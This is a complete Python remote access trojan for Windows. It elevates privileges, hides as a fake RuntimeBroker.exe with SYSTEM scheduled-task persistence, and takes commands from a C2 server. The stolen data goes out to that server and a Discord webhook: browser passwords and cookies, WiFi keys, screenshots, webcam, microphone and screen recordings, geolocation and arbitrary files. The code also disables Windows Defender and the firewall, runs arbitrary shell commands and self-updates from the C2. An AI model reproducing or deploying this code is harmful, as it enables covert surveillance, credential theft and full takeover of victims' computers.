import sys, os, subprocess, requests, time, platform, json, zipfile, shutil, sqlite3, base64

# --- OPERATIONAL MODE SWITCH ---
TEST_MODE = True

if platform.system() == "Windows": import ctypes

def elevate():
    if platform.system() == "Windows":
        try:
            if ctypes.windll.shell32.IsUserAnAdmin(): return
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(f'"{a}"' for a in sys.argv), None, 0)
            os._exit(0)
        except Exception: pass
elevate()

def establish_persistence_and_masquerade():
    if platform.system() != "Windows" or TEST_MODE: return
    
    # Target locations
    hidden_dir = os.path.join(os.environ.get('ProgramData', 'C:\\ProgramData'), 'Windows NT')
    os.makedirs(hidden_dir, exist_ok=True)
    
    # 1. Process Masquerading (Ghosting python.exe -> RuntimeBroker.exe)
    fake_exe_path = os.path.join(hidden_dir, "RuntimeBroker.exe")
    payload_path = os.path.join(hidden_dir, "sys_update.py")
    
    # Copy current python/exe runtime and payload script
    if not os.path.exists(fake_exe_path):
        try: shutil.copy2(sys.executable, fake_exe_path)
        except: pass
    if not os.path.exists(payload_path) or os.path.abspath(sys.argv[0]) != os.path.abspath(payload_path):
        try: shutil.copy2(sys.argv[0], payload_path)
        except: pass

    # If we are NOT already running as the fake RuntimeBroker, we respawn and die.
    if os.path.abspath(sys.executable) != os.path.abspath(fake_exe_path):
        # We spawn the ghost process
        subprocess.Popen([fake_exe_path, payload_path], creationflags=subprocess.CREATE_NO_WINDOW)
        os._exit(0) # Immediately kill the original python.exe so it vanishes from Task Manager

    # 2. Persistence (Scheduled Task)
    # At this point, we ARE running heavily disguised as RuntimeBroker.exe
    vbs_launcher = os.path.join(hidden_dir, "launch.vbs")
    if not os.path.exists(vbs_launcher):
        try:
            with open(vbs_launcher, "w") as f:
                f.write(f'Set objShell = CreateObject("WScript.Shell")\n')
                # 0 means hide window
                f.write(f'objShell.Run """{fake_exe_path}"" ""{payload_path}""", 0, False\n')
            
            # Create a scheduled task that runs on System Start/Logon with Highest Privileges
            task_cmd = f'schtasks /create /tn "Microsoft\\Windows\\Wininet\\CacheTask" /tr "wscript.exe \\"{vbs_launcher}\\"" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
            subprocess.run(task_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except: pass

establish_persistence_and_masquerade()

import numpy as np # Required for screen recording

# --- Configuration ---
C2_URL = "http://YOUR_C2_SERVER_IP:8080"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN" # Replace with your webhook URL
HEARTBEAT_INTERVAL = 5

def log(message):
    if TEST_MODE: print(message)

# --- Stateful Shell Class ---
class StatefulShell:
    def __init__(self):
        self.cwd = os.getcwd()
    
    def execute(self, command):
        command = command.strip()
        if not command: return ""
        if command.lower().startswith('cd '):
            try:
                new_dir = command[3:].strip()
                if not os.path.isabs(new_dir): new_dir = os.path.join(self.cwd, new_dir)
                os.chdir(new_dir)
                self.cwd = os.getcwd()
                return f"Changed directory to: {self.cwd}"
            except Exception as e: return f"Error changing directory: {e}"
        try:
            is_windows = platform.system() == "Windows"
            shell_cmd = ["powershell.exe", "-NoProfile", "-Command", command] if is_windows else ["/bin/sh", "-c", command]
            result = subprocess.run(shell_cmd, cwd=self.cwd, capture_output=True, text=True, errors='ignore', timeout=60)
            return result.stdout + result.stderr if (result.stdout + result.stderr) else "Command executed."
        except Exception as e: return f"Error executing command: {e}"

# --- Helper & Media Functions ---
def post_output(client_id, cmd_id, command_line, output):
    # 1. Report to C2 (Maintains UI status)
    try:
        short_out = (output[:500] + "...") if len(output) > 500 else output
        requests.post(f"{C2_URL}/report/{client_id}", json={'cmd_id': cmd_id, 'output': f"(Check Discord for full output)\n{short_out}"}, timeout=10)
    except: pass
    
    # 2. Alert to Discord Webhook (Practical & Persistent Results)
    try:
        header = f"**[Result]** `{client_id[:8]}` (CMD: `{command_line}`)\n"
        if len(output) > 1900:
            temp_path = os.path.join(os.getenv("TEMP"), f"res_{cmd_id}.txt")
            with open(temp_path, "w", encoding="utf-8") as f: f.write(output)
            with open(temp_path, "rb") as f:
                requests.post(DISCORD_WEBHOOK_URL, data={"content": header}, files={"file": (f"result_{cmd_id}.txt", f.read())})
            if os.path.exists(temp_path): os.remove(temp_path)
        else:
            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"{header}```\n{output}\n```"})
    except: pass

def exfiltrate_file(filepath, client_id=None, message=""):
    try:
        if not os.path.exists(filepath) or os.path.getsize(filepath) == 0:
            return f"File exfiltration failed: '{os.path.basename(filepath)}' is missing or empty."
        
        file_size = os.path.getsize(filepath)
        
        # If larger than ~20MB, try to send to C2 Loot endpoint directly
        if file_size > 20_000_000 and client_id:
            with open(filepath, 'rb') as f:
                r = requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
            return f"File exported to C2 exfiltrated folder ({file_size/1e6:.1f}MB)."

        with open(filepath, 'rb') as f:
            r = requests.post(DISCORD_WEBHOOK_URL, data={"content": message}, files={"file": (os.path.basename(filepath), f.read())})
            if r.status_code >= 400 and client_id: # Fallback to C2 if Discord rejects
                f.seek(0)
                requests.post(f"{C2_URL}/loot/{client_id}", files={"file": (os.path.basename(filepath), f.read())}, timeout=60)
                return f"Discord rejected file. Exported to C2 instead ({file_size/1e6:.1f}MB)."
        return "" # Suppress duplicate text log on success
    except Exception as e:
        return f"File exfiltration failed: {e}"
    finally:
        if os.path.exists(filepath) and not TEST_MODE:
            try: os.remove(filepath)
            except: pass

def get_geolocation():
    if platform.system() == "Windows":
        try:
            ps_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"Add-Type -AssemblyName System.Device; $GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher; $GeoWatcher.Start(); $i=0; while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied') -and ($i -lt 50)) { Start-Sleep -Milliseconds 100; $i++ }; if ($GeoWatcher.Permission -eq 'Granted' -and $GeoWatcher.Status -eq 'Ready') { $GeoWatcher.Position.Location | ConvertTo-Json } else { Write-Error 'Location access denied or timeout.' }\""
            result = subprocess.run(ps_command, capture_output=True, text=True, timeout=15, shell=True)
            if result.returncode == 0 and result.stdout:
                data = json.loads(result.stdout); lat = data.get('Latitude', 'N/A'); lon = data.get('Longitude', 'N/A')
                return (f"Source: Windows Location Service\nCoords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
            else: return None, "GPS Error (or denied). Falling back to IP."
        except Exception: return None, "GPS Error. Falling back to IP."
    try:
        r = requests.get('https://ipinfo.io/json', timeout=10); data = r.json()
        loc = data.get('loc', 'N/A').split(','); lat, lon = (loc[0], loc[1]) if len(loc) == 2 else ('N/A', 'N/A')
        return (f"Source: IP-based (INACCURATE)\nIP: {data.get('ip', 'N/A')}\n"
                f"Location: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}\n"
                f"Coords: Lat={lat}, Lon={lon}\nMaps: https://maps.google.com/?q={lat},{lon}"), None
    except Exception as e: return None, f"Geolocation failed: {e}"

def take_screenshot():
    try:
        import mss
        filepath = os.path.join(os.getenv("TEMP"), "s.png")
        with mss.mss() as sct:
            sct.shot(output=filepath)
        return filepath, None
    except Exception as e: return None, f"Screenshot failed: {e}"

def take_webcam_photo():
    filepath = os.path.join(os.getenv("TEMP"), "c.png")
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None, "Webcam could not be opened."
        time.sleep(1) # Allow camera to initialize
        ret, frame = cap.read()
        cap.release()
        cv2.destroyAllWindows()
        if ret:
            cv2.imwrite(filepath, frame)
            return filepath, None
        else:
            return None, "Webcam failed to capture frame."
    except Exception as e:
        return None, f"Webcam capture failed: {e}"

def record_screen_video(seconds=10):
    filepath = os.path.join(os.getenv("TEMP"), "s.mp4")
    try:
        import mss, cv2
        with mss.mss() as sct:
            mon = sct.monitors[1] # Primary monitor
            w, h = mon['width'], mon['height']
            out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'mp4v'), 10.0, (w, h))
            end_time = time.time() + seconds
            while time.time() < end_time:
                img = sct.grab(mon)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR) # Convert to BGR for OpenCV
                out.write(frame)
            out.release()
        return filepath, None
    except Exception as e:
        return None, f"Screen recording failed: {e}"

def record_video(seconds=10, mode='cam'):
    if mode == 'screen':
        return record_screen_video(seconds)
    
    filepath = os.path.join(os.getenv("TEMP"), "v.mp4")
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened(): return None, "Webcam could not be opened."
        w, h = int(cap.get(3)), int(cap.get(4))
        out = cv2.VideoWriter(filepath, cv2.VideoWriter_fourcc(*'mp4v'), 20.0, (w, h))
        end_time = time.time() + seconds
        while time.time() < end_time:
            ret, frame = cap.read()
            if not ret: break
            out.write(frame)
        cap.release()
        out.release()
        cv2.destroyAllWindows()
        return filepath, None
    except Exception as e:
        return None, f"Webcam recording failed: {e}"

def record_audio(seconds=10):
    filepath = os.path.join(os.getenv("TEMP"), "a.wav")
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        fs = 44100
        rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()
        write(filepath, fs, rec)
        return filepath, None
    except Exception as e:
        return None, f"Audio recording failed: {e}"

def get_ffmpeg_path():
    ffmpeg_dir = os.path.join(os.getenv("TEMP"), "ffmpeg_bin")
    ffmpeg_exe = os.path.join(ffmpeg_dir, "ffmpeg.exe")
    if os.path.exists(ffmpeg_exe): return ffmpeg_exe
    
    os.makedirs(ffmpeg_dir, exist_ok=True)
    zip_path = os.path.join(ffmpeg_dir, "ffmpeg.zip")
    log("[*] Downloading FFmpeg statically...")
    try:
        url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        r = requests.get(url, stream=True, timeout=60)
        with open(zip_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): f.write(chunk)
        
        with zipfile.ZipFile(zip_path, 'r') as zip_ref:
            for file_info in zip_ref.infolist():
                if "ffmpeg.exe" in file_info.filename:
                    file_info.filename = "ffmpeg.exe"
                    zip_ref.extract(file_info, ffmpeg_dir)
                    break
        os.remove(zip_path)
        return ffmpeg_exe
    except Exception as e:
        log(f"FFmpeg DL Error: {e}")
        return None

def find_audio_device(ffmpeg_exe, search_term=""):
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        res = subprocess.run([ffmpeg_exe, "-list_devices", "true", "-f", "dshow", "-i", "dummy"], capture_output=True, text=True, stderr=subprocess.STDOUT, creationflags=cf)
        in_audio_section = False
        for line in res.stdout.split('\n'):
            if "DirectShow audio devices" in line: in_audio_section = True; continue
            if in_audio_section and search_term.lower() in line.lower() and '"' in line:
                return line.split('"')[1]
        # If searching blank, just return the first audio device found
        if search_term == "" and in_audio_section:
            for line in res.stdout.split('\n'):
                if "DirectShow audio devices" in line: in_audio_section = True; continue
                if in_audio_section and '"' in line: return line.split('"')[1]
    except: pass
    return None

def record_av(seconds=10, mode='normal'):
    filepath = os.path.join(os.getenv("TEMP"), "av_sync.mp4")
    if os.path.exists(filepath): os.remove(filepath)
    
    ffmpeg_exe = get_ffmpeg_path()
    if not ffmpeg_exe: return None, "FFmpeg setup failed. Target blocked zip download?"
    
    mic = find_audio_device(ffmpeg_exe, "") 
    if not mic: mic = "Microphone" # Wild guess, might fail
    
    cmd = [ffmpeg_exe, "-y", "-f", "gdigrab", "-framerate", "15", "-i", "desktop"]
    if mode == 'full':
        stereo_mix = find_audio_device(ffmpeg_exe, "Stereo Mix")
        if stereo_mix:
            cmd.extend(["-f", "dshow", "-i", f"audio={mic}", "-f", "dshow", "-i", f"audio={stereo_mix}"])
            cmd.extend(["-filter_complex", "[1:a][2:a]amix=inputs=2[a]", "-map", "0:v", "-map", "[a]"])
        else:
            return None, "--full rejected: 'Stereo Mix' device not found or disabled in Target PC sound settings. Try regular 'record'."
    else:
        cmd.extend(["-f", "dshow", "-i", f"audio={mic}", "-map", "0:v", "-map", "1:a"])
    
    cmd.extend(["-c:v", "libx264", "-preset", "ultrafast", "-t", str(seconds), filepath])
    try:
        cf = subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
        subprocess.run(cmd, creationflags=cf, timeout=seconds + 5)
        return filepath, None
    except Exception as e:
        return None, f"FFmpeg Recording failed: {e}"

# =========================================================================
# V8 Arsenal: Browser Stealer, WiFi Stealer, AV Killer, Self-Update
# =========================================================================

def steal_browser_data(mode='passwords'):
    """Steal saved passwords or cookies from Chrome and Edge."""
    if platform.system() != "Windows": return None, "Browser stealer is Windows-only."
    
    results = []
    browsers = {
        'Chrome': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data'),
        'Edge': os.path.join(os.environ.get('LOCALAPPDATA', ''), r'Microsoft\Edge\User Data'),
    }
    
    for browser_name, user_data_path in browsers.items():
        local_state_path = os.path.join(user_data_path, 'Local State')
        if not os.path.exists(local_state_path): continue
        
        try:
            # 1. Get the AES encryption key
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            
            import ctypes, ctypes.wintypes
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [('cbData', ctypes.wintypes.DWORD), ('pbData', ctypes.POINTER(ctypes.c_char))]
            
            input_blob = DATA_BLOB(len(encrypted_key), ctypes.create_string_buffer(encrypted_key, len(encrypted_key)))
            output_blob = DATA_BLOB()
            ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(input_blob), None, None, None, None, 0, ctypes.byref(output_blob))
            master_key = ctypes.string_at(output_blob.pbData, output_blob.cbData)
            
            # 2. Find and copy the database
            if mode == 'passwords':
                db_name = 'Login Data'
                results.append(f"\n=== {browser_name} Passwords ===")
            else:
                db_name = 'Cookies'
                results.append(f"\n=== {browser_name} Cookies ===")
            
            # Search Default and Profile folders
            profiles = ['Default'] + [f'Profile {i}' for i in range(1, 10)]
            for profile in profiles:
                db_path = os.path.join(user_data_path, profile, db_name)
                if not os.path.exists(db_path): continue
                
                temp_db = os.path.join(os.getenv('TEMP'), f'tmp_{browser_name}_{profile}_{db_name}.db')
                try: shutil.copy2(db_path, temp_db)
                except: continue
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                
                try:
                    if mode == 'passwords':
                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                        for url, user, enc_pass in cursor.fetchall():
                            if not user: continue
                            try:
                                from Crypto.Cipher import AES
                                iv = enc_pass[3:15]
                                payload_bytes = enc_pass[15:-16]
                                tag = enc_pass[-16:]
                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                                decrypted = cipher.decrypt_and_verify(payload_bytes, tag).decode('utf-8', errors='ignore')
                                results.append(f"URL: {url}\nUser: {user}\nPass: {decrypted}\n")
                            except: results.append(f"URL: {url}\nUser: {user}\nPass: [DECRYPT FAILED]\n")
                    else:
                        cursor.execute('SELECT host_key, name, encrypted_value FROM cookies LIMIT 200')
                        for host, name, enc_val in cursor.fetchall():
                            try:
                                from Crypto.Cipher import AES
                                iv = enc_val[3:15]
                                payload_bytes = enc_val[15:-16]
                                tag = enc_val[-16:]
                                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                                decrypted = cipher.decrypt_and_verify(payload_bytes, tag).decode('utf-8', errors='ignore')
                                results.append(f"{host} | {name} = {decrypted[:80]}")
                            except: pass
                except: pass
                conn.close()
                try: os.remove(temp_db)
                except: pass
        except Exception as e:
            results.append(f"{browser_name}: Error - {e}")
    
    if not results: return None, "No browser data found (Chrome/Edge not installed?)."
    
    output = "\n".join(results)
    # Save to temp file for exfiltration
    filepath = os.path.join(os.getenv('TEMP'), f'browser_{mode}.txt')
    with open(filepath, 'w', encoding='utf-8') as f: f.write(output)
    return filepath, None

def steal_wifi():
    """Extract all saved WiFi passwords using netsh."""
    if platform.system() != "Windows": return None, "WiFi stealer is Windows-only."
    try:
        cf = subprocess.CREATE_NO_WINDOW
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=cf)
        profiles = [line.split(':')[1].strip() for line in result.stdout.split('\n') if 'All User Profile' in line]
        
        wifi_list = []
        for profile in profiles:
            try:
                detail = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], capture_output=True, text=True, creationflags=cf)
                password = ''
                for line in detail.stdout.split('\n'):
                    if 'Key Content' in line:
                        password = line.split(':')[1].strip()
                        break
                wifi_list.append(f"SSID: {profile}  |  Password: {password if password else '[OPEN/NO KEY]'}")
            except: pass
        
        return "\n".join(wifi_list) if wifi_list else "No WiFi profiles found.", None
    except Exception as e:
        return None, f"WiFi steal failed: {e}"

def av_kill():
    """Attempt to disable Windows Defender and Firewall."""
    if platform.system() != "Windows": return None, "AV Killer is Windows-only."
    results = []
    cf = subprocess.CREATE_NO_WINDOW
    
    commands = [
        ("Disable Defender Real-time", 'Set-MpPreference -DisableRealtimeMonitoring $true'),
        ("Exclude C:\\ from scans", 'Add-MpPreference -ExclusionPath "C:\\"'),
        ("Disable Behavior Monitoring", 'Set-MpPreference -DisableBehaviorMonitoring $true'),
        ("Disable IOAV Protection", 'Set-MpPreference -DisableIOAVProtection $true'),
        ("Disable Script Scanning", 'Set-MpPreference -DisableScriptScanning $true'),
        ("Disable Firewall (Domain)", 'Set-NetFirewallProfile -Profile Domain -Enabled False'),
        ("Disable Firewall (Private)", 'Set-NetFirewallProfile -Profile Private -Enabled False'),
        ("Disable Firewall (Public)", 'Set-NetFirewallProfile -Profile Public -Enabled False'),
    ]
    
    for desc, ps_cmd in commands:
        try:
            r = subprocess.run(['powershell.exe', '-NoProfile', '-Command', ps_cmd], capture_output=True, text=True, creationflags=cf, timeout=10)
            status = "✅ OK" if r.returncode == 0 else f"❌ BLOCKED ({r.stderr.strip()[:60]})"
            results.append(f"{desc}: {status}")
        except Exception as e:
            results.append(f"{desc}: ❌ ERROR ({e})")
    
    return "\n".join(results), None

def self_update(client_id):
    """Download new payload version from C2 and restart."""
    try:
        r = requests.get(f"{C2_URL}/update", timeout=30)
        if r.status_code == 200:
            script_path = os.path.abspath(sys.argv[0])
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(r.text)
            # Restart self
            os.execv(sys.executable, [sys.executable, script_path])
        else:
            return f"C2 returned {r.status_code}. No update available."
    except Exception as e:
        return f"Self-update failed: {e}"

def main():
    log("[*] Initializing stateful shell...")
    shell = StatefulShell()
    os_info = f"{platform.system()} {platform.release()}"
    
    while True:
        client_id = None
        while not client_id:
            try:
                log(f"[*] Attempting to register with C2 at {C2_URL}...")
                r = requests.post(f"{C2_URL}/register", json={'os_info': os_info}, timeout=10)
                r.raise_for_status()
                client_id = r.json().get('client_id')
                log(f"[+] Registered with ID: {client_id}")
            except Exception as e:
                log(f"[!] C2 registration failed: {e}. Retrying...")
                time.sleep(HEARTBEAT_INTERVAL)
                
        while True:
            try:
                r = requests.post(f"{C2_URL}/heartbeat/{client_id}", json={'cwd': shell.cwd}, timeout=10)
                r.raise_for_status()
                tasks = r.json().get('tasks', [])
                for task in tasks:
                    cmd_id = task.get('cmd_id')
                    command_line = task.get('command', '').strip()
                    if not command_line: continue
                    parts = command_line.split()
                    cmd = parts[0].lower()
                    output = ""
                    
                    if cmd in ["geolocate", "geo"]: 
                        report, err = get_geolocation(); output = err if err else report
                    elif cmd in ["screenshot", "ss"]: 
                        filepath, err = take_screenshot(); output = err if err else exfiltrate_file(filepath, client_id, f"Screenshot: `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["webcam", "wc"]: 
                        filepath, err = take_webcam_photo(); output = err if err else exfiltrate_file(filepath, client_id, f"Webcam: `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["record_video", "rec_v"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        mode = parts[2].lower() if len(parts) > 2 else 'cam'
                        filepath, err = record_video(seconds, mode); output = err if err else exfiltrate_file(filepath, client_id, f"Video ({mode}, {seconds}s): `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["record_audio", "rec_a"]: 
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10; filepath, err = record_audio(seconds); output = err if err else exfiltrate_file(filepath, client_id, f"Audio ({seconds}s): `{client_id}` (CMD: `{command_line}`)")
                    elif cmd in ["export", "exp"]:
                        filepath = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        output = exfiltrate_file(filepath, client_id, f"Export: `{filepath}`") if filepath else "Error: filename required."
                    elif cmd == "sys_upload":
                        filename = command_line.split(maxsplit=1)[1] if len(parts) > 1 else ""
                        if filename:
                            try:
                                r = requests.get(f"{C2_URL}/serve/{filename}", timeout=30)
                                if r.status_code == 200:
                                    save_path = os.path.join(shell.cwd, filename)
                                    with open(save_path, "wb") as f: f.write(r.content)
                                    output = f"Uploaded `{filename}` successfully to `{shell.cwd}`."
                                else: output = f"Failed to download {filename} from C2."
                            except Exception as e: output = f"sys_upload error: {e}"
                        else: output = "sys_upload error: no filename"
                    elif cmd == "record":
                        seconds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 10
                        mode = 'full' if '--full' in command_line.lower() else 'normal'
                        filepath, err = record_av(seconds, mode)
                        output = err if err else exfiltrate_file(filepath, client_id, f"AV-Sync Record ({mode}, {seconds}s): `{client_id}`")
                    elif cmd == "steal":
                        mode = parts[1].lower() if len(parts) > 1 else 'passwords'
                        filepath, err = steal_browser_data(mode)
                        output = err if err else exfiltrate_file(filepath, client_id, f"🍪 Browser {mode}: `{client_id}`")
                    elif cmd == "wifi":
                        report, err = steal_wifi(); output = err if err else report
                    elif cmd == "avkill":
                        report, err = av_kill(); output = err if err else report
                    elif cmd == "sys_update":
                        output = self_update(client_id) or "Restarting with new payload..."
                    else: 
                        output = shell.execute(command_line)
                    
                    if output:
                        post_output(client_id, cmd_id, command_line, str(output))
            except requests.exceptions.RequestException:
                log("[!] C2 connection lost. Re-registering...")
                break # Break inner loop to re-register
            except Exception as e:
                log(f"[!] Main loop error: {e}")

            time.sleep(HEARTBEAT_INTERVAL)

if __name__ == '__main__':
    main()